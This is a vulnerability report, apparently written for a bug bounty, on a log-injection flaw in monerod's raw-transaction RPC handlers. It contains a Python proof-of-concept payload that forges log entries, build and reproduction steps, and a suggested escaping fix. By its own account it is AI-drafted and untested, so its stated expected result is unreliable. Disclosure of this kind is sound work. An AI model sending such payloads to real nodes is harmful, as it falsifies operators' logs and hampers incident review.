# `send_raw_transaction`'s hex-parse-failure log line embeds the raw request field, letting a standards-compliant JSON payload forge log entries even after the JSON-parser log-injection fix

## Summary

Two recently-fixed reports against this program established that `monerod` could be made to write forged, multi-line log entries by getting raw, attacker-controlled bytes into a log call before they were escaped: one via epee's JSON parser choking on a malformed, unterminated string and logging the raw unparsed remainder; one via `zmq_server.cpp` logging a ZMQ request's raw body unconditionally.

`on_send_raw_tx` (the handler behind the public `/send_raw_transaction` HTTP RPC endpoint) and its ZMQ-RPC equivalent, `SendRawTxHex`, contain a third, independent instance of the same underlying outcome — but it is **not fixed by the JSON-parser patch**, because it does not depend on a malformed JSON payload at all. It fires on a perfectly valid, standards-compliant JSON request whose `tx_as_hex` field simply isn't valid hex:

```cpp
// src/rpc/core_rpc_server.cpp
if(!string_tools::parse_hexstr_to_binbuff(req.tx_as_hex, tx_blob))
{
  LOG_PRINT_L0("[on_send_raw_tx]: Failed to parse tx from hexbuff: " << req.tx_as_hex);
  ...
}
```

JSON's own escape sequences (`\n`, `\r`, `\t`, …) are decoded into their literal control-byte equivalents by epee's JSON parser — correctly, as required by RFC 8259 — before `req.tx_as_hex` is ever populated. A request body containing `"tx_as_hex":"deadbeef\nFAKE_LOG_LINE"` is valid JSON, parses cleanly (nothing for the just-shipped control-byte rejection to reject — there is no *raw*, unescaped control byte in the JSON source text), and by the time it reaches this log line, `req.tx_as_hex` legitimately contains a real newline byte. Since `"deadbeef\nFAKE_LOG_LINE"` is not valid hex, the log line fires and writes that raw, newline-containing string straight into the daemon's log.

## Severity

Monero severity: **MEDIUM**, consistent with the maintainer's own triage of the two sibling reports (both rated Medium, "CRLF Injection").
Suggested CVSS v3.1: `5.3` with `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`.

Rationale:
1. `/send_raw_transaction` and `/sendrawtransaction` are registered with plain `MAP_URI_AUTO_JON2` (no restricted-mode gate), and ZMQ-RPC's `SendRawTxHex` has no restricted-mode check either — both reachable pre-authentication (`AV:N/PR:N/UI:N`).
2. A single, ordinary, spec-compliant JSON POST triggers it — no malformed input, no race (`AC:L`).
3. Impact is confined to log integrity, matching the sibling reports' scoring.

## Affected Versions

Confirmed present, identically, in both:
- **`master`**, commit `9e3a31032ee2cf3cb65c908e107a9952d03bbc4f` (the actively maintained branch):
  - HTTP path: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server.cpp#L1041-L1045
  - Endpoint registration (unrestricted): https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server.h#L106-L107
  - ZMQ path: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/daemon_handler.cpp#L377-L382
- **`v0.18.5.1`**, the latest tagged release, commit `4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`:
  - HTTP path: https://github.com/monero-project/monero/blob/4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5/src/rpc/core_rpc_server.cpp#L1329
  - Endpoint registration: https://github.com/monero-project/monero/blob/4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5/src/rpc/core_rpc_server.h#L115

This log line predates, and is untouched by, the recent JSON-parser and ZMQ log-injection fixes — it was never in scope for either, since neither of those patches change how already-successfully-parsed string fields are subsequently logged.

## Root Cause

`src/rpc/core_rpc_server.cpp`, `on_send_raw_tx` (HTTP path, registered pre-authentication via `MAP_URI_AUTO_JON2("/send_raw_transaction", ...)` in `core_rpc_server.h` with no `_IF(...,!m_restricted)` variant):

```cpp
bool core_rpc_server::on_send_raw_tx(const COMMAND_RPC_SEND_RAW_TX::request& req, COMMAND_RPC_SEND_RAW_TX::response& res, const connection_context *ctx)
{
  RPC_TRACKER(send_raw_tx);

  CHECK_CORE_READY();

  std::string tx_blob;
  if(!string_tools::parse_hexstr_to_binbuff(req.tx_as_hex, tx_blob))
  {
    LOG_PRINT_L0("[on_send_raw_tx]: Failed to parse tx from hexbuff: " << req.tx_as_hex);
    res.status = "Failed";
    res.reason = "Hex decoding failed";
    return true;
  }
  ...
```

`src/rpc/daemon_handler.cpp`, the equivalent ZMQ-RPC handler (parsed independently via rapidjson in `src/rpc/message.cpp`, not epee's JSON parser at all, and with no `m_restricted` check in this function unlike several of its neighbors in the same file):

```cpp
void DaemonHandler::handle(const SendRawTxHex::Request& req, SendRawTxHex::Response& res)
{
  cryptonote::blobdata tx_blob;
  if (!epee::string_tools::parse_hexstr_to_binbuff(req.tx_as_hex, tx_blob))
  {
    MERROR("[SendRawTxHex]: Failed to parse tx from hexbuff: " << req.tx_as_hex);
    ...
```

Both simply concatenate the request's own string field into a log line, with no escaping, on the ordinary "this wasn't valid hex" error path — a condition trivially reached by any malformed-but-otherwise-legitimate submission.

The reason JSON's own escaping produces exploitable raw bytes here (rather than being neutralized by it, as it is for genuinely binary/opaque fields) is that `tx_as_hex` is subsequently treated as *text* by the very check that fails — `parse_hexstr_to_binbuff` walks the string looking for hex digit pairs and simply returns `false` the moment it hits a non-hex byte such as `\n`, without ever caring that the string contains raw control bytes. Compare this to how the codebase already correctly guards output in the opposite direction: `dump_as_json()` (`contrib/epee/include/storages/portable_storage_to_json.h:126`) always routes outbound string values through `misc_utils::parse::transform_to_escape_sequence` before writing them, precisely so that a string round-tripped back out to JSON can't smuggle raw control bytes. No equivalent escaping exists on this particular log path.

## Steps to Reproduce

### 1. Build and run a target daemon

```
git clone --branch v0.18.5.1 --depth 1 https://github.com/monero-project/monero.git
cd monero && git submodule update --init --recursive
mkdir -p build/release && cd build/release
cmake -D CMAKE_BUILD_TYPE=Release -D BUILD_TESTS=OFF ../..
make -j"$(nproc)" daemon

./bin/monerod --regtest --fixed-difficulty 1 --offline \
  --data-dir /tmp/monero-poc-sendraw/chain \
  --rpc-bind-ip 127.0.0.1 --rpc-bind-port 38081 --confirm-external-bind \
  --log-level 0 --non-interactive &
echo "daemon pid: $!"
```

### 2. Send a single, valid JSON request whose `tx_as_hex` contains a JSON-escaped newline

```python
#!/usr/bin/env python3
# poc_send_raw_tx_log_injection.py
import json
import sys
import urllib.request

target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:38081/send_raw_transaction"

# A perfectly valid JSON document. json.dumps() will correctly emit \n as the
# two-character escape sequence "\\n" in the JSON source text -- there is no
# raw, unescaped control byte on the wire, so the already-fixed JSON parser
# has nothing to reject here. It is only *after* successful parsing that the
# decoded string legitimately contains a real newline byte.
forged = (
    "deadbeef ATTACKER_MARKER_BEGIN\n"
    "2026-01-01 00:00:00.000\tI FORGED_LOG_LINE: authentication succeeded for admin\n"
    "ATTACKER_MARKER_END"
)
body = json.dumps({"tx_as_hex": forged, "do_not_relay": True}).encode()

print(f"POST {target}")
print("raw wire bytes (note the literal backslash-n, not a real newline):")
print(body)

req = urllib.request.Request(target, data=body, method="POST",
                              headers={"Content-Type": "application/json"})
try:
    with urllib.request.urlopen(req, timeout=15) as resp:
        print("HTTP", resp.status, resp.read()[:300])
except Exception as e:
    print("request finished with:", e)
```

```
python3 poc_send_raw_tx_log_injection.py http://127.0.0.1:38081/send_raw_transaction
```

As a control, also try the same content with `\n` not escaped (a literal raw newline byte in the JSON source) — that request should now be correctly rejected by the fixed JSON parser before ever reaching `on_send_raw_tx`, confirming the two are genuinely different code paths.

### 3. Check the daemon's log

```
grep -n "FORGED_LOG_LINE\|ATTACKER_MARKER" /tmp/monero-poc-sendraw/chain/regtest/bitmonero.log
```

### Expected result on the vulnerable build

`[on_send_raw_tx]: Failed to parse tx from hexbuff: deadbeef ATTACKER_MARKER_BEGIN` on its own line, followed by a real blank-timestamp-prefixed `FORGED_LOG_LINE` entry, followed by `ATTACKER_MARKER_END` — three physical lines from one well-formed request, none of them rejected by the JSON parser at any point.

For the ZMQ path, the equivalent JSON-RPC method (`send_raw_tx_hex`) sent over the daemon's ZMQ-RPC socket with the same escaped-newline `tx_as_hex` field should produce the analogous forged entry from `daemon_handler.cpp:381` (`MERROR("[SendRawTxHex]: ...")`), independent of and unaffected by the epee-JSON-specific fix, since this path is parsed by rapidjson rather than epee's JSON parser.

## Possible Solution

Route `req.tx_as_hex` through `misc_utils::parse::transform_to_escape_sequence` (the same function already used to safely echo untrusted, already-parsed string content in `dump_as_json()` and in the fixed JSON-parser exception log) before interpolating it into either log line:

```cpp
LOG_PRINT_L0("[on_send_raw_tx]: Failed to parse tx from hexbuff: "
             << epee::misc_utils::parse::transform_to_escape_sequence(req.tx_as_hex));
```

and equivalently in `daemon_handler.cpp`. More generally, any log statement anywhere in the RPC layer that interpolates an already-successfully-parsed request string field (as opposed to a raw pre-parse buffer, which the two already-fixed reports covered) should be checked for the same gap — this class of bug is not specific to `tx_as_hex`, it applies to any string field whose failure path logs the field's own content verbatim.

## Impact

* Forged log lines from a single, ordinary, spec-compliant RPC request — no malformed JSON needed, so this survives the recent JSON-parser hardening entirely.
* Reachable on both transports independently: HTTP (`/send_raw_transaction`, `/sendrawtransaction`) and ZMQ-RPC (`send_raw_tx_hex`), the latter with no restricted-mode gate at all, matching the exposure the maintainers already recognized when fixing the ZMQ sibling report.
* Same downstream consequences as the two already-triaged reports: fabricated log entries, degraded SIEM/log-tooling trust, complicated incident review.

## Note on AI usage

Source-code analysis (recognizing that the just-shipped JSON-parser fix only rejects *raw* control bytes in JSON source text, and that a *successfully decoded* string field can still legitimately carry real control bytes into an unescaped log call) and drafting of this report were done with AI assistance, working directly against the `v0.18.5.1` and `master` source. **This has been verified by static code reading only — the PoC script has been checked for correctness against the exact hex-parsing and logging code path but has not been run against a live `monerod` process.** Please run it and attach the resulting log lines before submitting, per this program's requirement for a working PoC with logs.
